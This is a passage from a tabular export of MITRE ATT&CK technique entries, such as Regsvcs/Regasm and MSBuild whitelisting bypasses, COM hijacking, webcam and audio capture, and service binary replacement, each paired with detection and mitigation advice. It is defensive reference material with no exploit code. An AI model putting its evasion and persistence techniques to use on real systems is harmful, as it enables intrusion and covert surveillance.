'SYSTEM']",[],[],['Discovery'],Technique/T1120,['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
1512,['Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.'],['Process whitelisting'],[],['Casey Smith'],"['Process monitoring', 'Process command-line parameters']",['Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.[[CiteRef::MSDN Regsvcs]][[CiteRef::MSDN Regasm]]\n\nAdversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.[[CiteRef::SubTee GitHub All The Things Application Whitelisting Bypass]]'],[],[],[],['Regsvcs and Regasm may not be necessary within a given environment. Block execution of Regsvcs.exe and Regasm.exe if they are not required for a given system or network to prevent potential misuess by adversaries.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Execution']",Technique/T1121,['Regsvcs/Regasm'],https://attack.mitre.org/wiki/Technique/T1121
1513,"['There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>.[[CiteRef::Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.']",['Autoruns Analysis'],[],['ENDGAME'],"['Windows Registry', 'DLL monitoring', 'Loaded DLLs']","[""The Microsoft Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system.[[CiteRef::Microsoft Component Object Model]] Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[[CiteRef::GDATA COM Hijacking]] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.""]",[],[],[],"['Direct mitigation of this technique may not be recommended for a particular environment since COM objects are a legitimate part of the operating system and installed software. Blocking COM object changes may have unforeseen side effects to legitimate functionality.\n\nInstead, identify and block potentially malicious software that may execute, or be executed by, this technique using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Persistence']",Technique/T1122,['Component Object Model Hijacking'],https://attack.mitre.org/wiki/Technique/T1122
1514,"['Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']","[""An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.""]",[],[],[],"['Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted or unknown code from executing on a system.\n\nIdentify and block potentially malicious software that may be used to record audio by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']",['User'],[],[],['Collection'],Technique/T1123,['Audio Capture'],https://attack.mitre.org/wiki/Technique/T1123
1515,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']","[""The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.[[CiteRef::MSDN System Time]][[CiteRef::Technet Windows Time Service]]\n\nAn adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with [[Software/S0039|Net]] on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.[[CiteRef::Technet Windows Time Service]] The information could be useful for performing other techniques, such as executing a file with a [[Technique/T1053|Scheduled Task]][[CiteRef::RSA EU12 They're Inside]], or to discover locality information based on time zone to assist in victim targeting.""]",[],[],[],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Discovery'],Technique/T1124,['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
1516,"['Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.']",[],[],[],"['Process monitoring', 'File monitoring', 'API monitoring']","[""An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [[Technique/T1113|Screen Capture]] due to use of specific devices or applications for video recording rather than capturing the victim's screen.""]",[],[],[],"['Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted or unknown code from executing on a system.\n\nIdentify and block potentially malicious software that may be used to capture video and images by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Collection'],Technique/T1125,['Video Capture'],https://attack.mitre.org/wiki/Technique/T1125
1517,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['Windows shared drive and [[Technique/T1077|Windows Admin Shares]] connections can be removed when no longer needed. [[Software/S0039|Net]] is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.[[CiteRef::Technet Net Use]]\n\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation.'],[],[],[],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],[],['Defense Evasion'],Technique/T1126,['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
1518,"['The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.']",['Application whitelisting'],[],['Casey Smith'],['Process monitoring'],"['There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.\n\n===MSBuild===\n\nMSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations.[[CiteRef::MSDN MSBuild]] \n\nAdversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file.[[CiteRef::MSDN MSBuild Inline Tasks]] MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution.[[CiteRef::SubTee GitHub All The Things Application Whitelisting Bypass]]\n\n===DNX===\n\nThe .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016.[[CiteRef::Microsoft Migrating from DNX]] DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. \n\nAn adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX.[[CiteRef::engima0x3 DNX Bypass]]\n\n===RCSI===\n\nThe rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution.[[CiteRef::Microsoft Roslyn CPT RCSI]] The rcsi.exe binary is signed by Microsoft.[[CiteRef::engima0x3 RCSI Bypass]]\n\nC# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe.[[CiteRef::engima0x3 RCSI Bypass]]\n\n===WinDbg/CDB===\n\nWinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools.[[CiteRef::Microsoft Debugging Tools for Windows]] They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities.[[CiteRef::Exploit Monday WinDbg]]\n\nIt is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.']",[],[],[],"['MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe may not be necessary within a given environment and should be removed if not used.\n\nUse application whitelisting configured to block execution of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, and cdb.exe if they are not required for a given system or network to prevent potential misuse by adversaries.[[CiteRef::Microsoft GitHub Device Guard CI Policies]][[CiteRef::Exploit Monday Mitigate Device Guard Bypases]][[CiteRef::GitHub mattifestation DeviceGuardBypass]][[CiteRef::SubTee MSBuild]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['MSBuild: .NET Framework version 4 or higher\nDNX: .NET 4.5.2, Powershell 4.0\nRCSI: .NET 4.5 or later, Visual Studio 2012']",[],"['Defense Evasion', 'Execution']",Technique/T1127,['Trusted Developer Utilities'],https://attack.mitre.org/wiki/Technique/T1127
1519,"['Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior.[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process command-line parameters', 'Process monitoring']","['Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)[[CiteRef::Wikipedia SMB]] and Remote Procedure Call Service (RPCS)[[CiteRef::TechNet RPC]] for remote access. RPCS operates over port 135.[[CiteRef::MSDN WMI]]\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for [[Discovery]] and remote [[Execution]] of files as part of [[Lateral Movement]].[[CiteRef::FireEye WMI 2015]]']",[],[],[],"['Disabling WMI or RPCS may cause system instability and should be evaluated to assess the impact to a network.  By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",[],['Execution'],Technique/T1047,['Windows Management Instrumentation'],https://attack.mitre.org/wiki/Technique/T1047
1520,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.']",[],[],[],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']","['Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.']",[],[],[],"['Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'Linux', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],Technique/T1046,['Network Service Scanning'],https://attack.mitre.org/wiki/Technique/T1046
1521,"['Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.']","['Anti-virus', 'heuristic detection', 'Signature-based detection']",['570'],[],['Binary file metadata'],"['Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,[[CiteRef::Wikipedia Exe Compression]] but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.']",[],[],[],['Ensure updated virus definitions. Create custom signatures for observed malware. Employ heuristic-based malware detection.\n\nIdentify and prevent execution of potentially malicious software that may have been packed by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],Technique/T1045,['Software Packing'],https://attack.mitre.org/wiki/Technique/T1045
1522,"['Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to [[Discovery]] or other adversary techniques.']",[],['17'],['Stefan Kanthak'],"['File monitoring', 'Process command-line parameters', 'Services']","['Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n===Services===\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n===Executable Installers===\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [[Technique/T1038|DLL Search Order Hijacking]]. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [[Technique/T1088|Bypass User Account Control]]. Several examples of this weakness in existing common installers have been reported to software vendors.[[CiteRef::Mozilla Firefox Installer DLL Hijack]][[CiteRef::Seclists Kanthak 7zip Installer]]']",[],[],[],"['Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through abuse of file, directory, and service permissions by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown programs. Deny execution from user directories such as file download directories and temp directories where able.[[CiteRef::Seclists Kanthak 7zip Installer]]\n\nTurn off UAC\'s privilege elevation for standard users and installer detection for all users by modifying registry key\n<code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code>to automatically deny elevation requests, add: <code>""ConsentPromptBehaviorUser""=dword:00000000</code>; to disable installer detection, add: <code>""EnableInstallerDetection""=dword:00000000</code>.[[CiteRef::Seclists Kanthak 7zip Installer]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Persistence', 'Privilege Escalation']",Technique/T1044,['File System Permissions Weakness'],https://attack.mitre.org/wiki/Technique/T1044
1523,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","['Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1043,['Commonly Used Port'],https://attack.mitre.org/wiki/Technique/T1043
1524,"[""Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process. \n\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.\n\nAlso look for abnormal process call trees for execution of other commands that could relate to [[Discovery]] actions or other techniques.""]",[],['556'],['Stefan Kanthak'],"['Windows Registry', 'Process command-line parameters', 'Process monitoring']","['When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access.[[CiteRef::Microsoft Change Default Programs]][[CiteRef::Microsoft File Handlers]] Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.']",[],[],[],"[""Direct mitigation of this technique is not recommended since it is a legitimate function that can be performed by users for software preferences. Follow Microsoft's best practices for file associations.[[CiteRef::MSDN File Associations]]\n\nIdentify and block potentially malicious software that may be executed by this technique using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1042,['Change Default File Association'],https://attack.mitre.org/wiki/Technique/T1042
1525,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['Data exfiltration is performed over the [[Command and Control]] channel.  Data is encoded into the normal communications channel using the same protocol as command and control communications.'],[],[],[],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1041,['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
1526,"['Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.']",[],['158'],[],"['Network device logs', 'Host network interface', 'Netflow/Enclave netflow']","['Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\n\nUser credentials may be sent over an insecure, unencrypted protocol that can be captured and obtained through network packet analysis. An adversary may place a network interface into promiscuous mode, using a utility to capture traffic in transit over the network or use span ports to capture a larger amount of data. In addition, Address Resolution Protocol (ARP) and Domain Name Service (DNS) poisoning can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.']",[],[],[],"['Ensure that all wireless traffic is encrypted appropriately. Use Kerberos, SSL, and multifactor authentication wherever possible. Monitor switches and network for span port usage, ARP/DNS poisoning, and router reconfiguration.\n\nIdentify and block potentially malicious software that may be used to sniff or analyze network traffic by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",['Network interface access and packet capture driver'],[],['Credential Access'],Technique/T1040,['Network Sniffing'],https://attack.mitre.org/wiki/Technique/T1040
1527,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']","['Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\n===Windows===\n\nUtilities and commands that acquire this information include [[Software/S0104|netstat]], ""net use,"" and ""net session"" with [[Software/S0039|Net]].\n\n===Mac and Linux ===\n\nIn Mac and Linux, <code>netstat</code> and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently 